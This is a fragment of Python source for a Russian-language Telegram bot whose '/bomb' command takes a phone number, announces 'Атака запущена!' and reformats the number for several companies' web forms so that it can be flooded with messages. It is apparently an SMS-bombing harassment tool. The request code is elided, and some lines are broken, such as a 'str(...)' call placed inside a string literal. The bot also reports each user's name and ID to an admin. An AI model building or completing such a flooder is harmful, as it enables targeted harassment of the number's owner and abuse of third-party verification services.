...
def help(message):
	bot.send_message(message.chat.id, 'Команды для данного хуебеса:\n/bomb - номер (RUS/UA)\n\n/id - узнать свой уникальный ID\n\n/test - проверить статус работы бота\n\n/info - хуй знает че писать')

@bot.message_handler(commands=['info'])
def authoring(message):
	bot.send_message(message.chat.id, "Разработал: @maxsingly; библиотеки, которые использовались: TeleBot, Random, Requests")
...
def ping(message):
	bot.send_message(message.chat.id, 'Работает: str(datatime.work.bot)')
...
def bomb(message):
    for i in range(1):
        try:
            ...
            bot.send_message(message.chat.id, 'Атака запущена!\nТаймер: str(datatime.work.status)\nНомер телефона: ' + bomb)
            bot.send_message(aid, "ID: " + str(message.chat.id) + "Полное имя: " + str(message.from_user.first_name) + " " + str(message.from_user.last_name) + '\nзапустил флуд на номер +' + bomb)
            _phone = bomb
        except:
            _phone = 'error'
            break
    if _phone == 'error':
        ...
        _phone9 = _phone[1:]
        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #порно
        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #порно
        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # порно
        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # порно
        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # порно
        iteration = 0
        def thsp(_phone, _name, _phone9, _phoneAresBank, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, iteration):
            while iteration < 10:
                try:
                    ...
                    iteration += 1
                    if iteration == 10:
                        bot.send_message(message.chat.id, 'Флуд остановлен. Пожалуйста не спамь, админ долбаеб, хостинг за 10 рублей')
                except:
                    continue
